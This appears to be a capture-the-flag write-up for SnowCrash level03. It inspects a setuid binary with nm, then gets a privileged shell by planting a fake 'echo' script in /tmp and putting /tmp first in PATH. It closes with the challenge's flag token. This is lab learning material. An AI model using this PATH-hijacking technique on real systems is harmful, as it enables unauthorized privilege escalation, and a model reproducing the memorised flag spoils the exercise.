### Exploit

```
level03@SnowCrash:~$ nm level03
[...]
080484a4 T main
         U setresgid@@GLIBC_2.0
         U setresuid@@GLIBC_2.0
         U system@@GLIBC_2.0
```

level03@SnowCrash:~$ id
uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)

```
level03@SnowCrash:~$ touch /tmp/echo
level03@SnowCrash:~$ cat /tmp/echo
#!/bin/sh
sh
level03@SnowCrash:~$ chmod 775 /tmp/echo
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03
$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
         
    
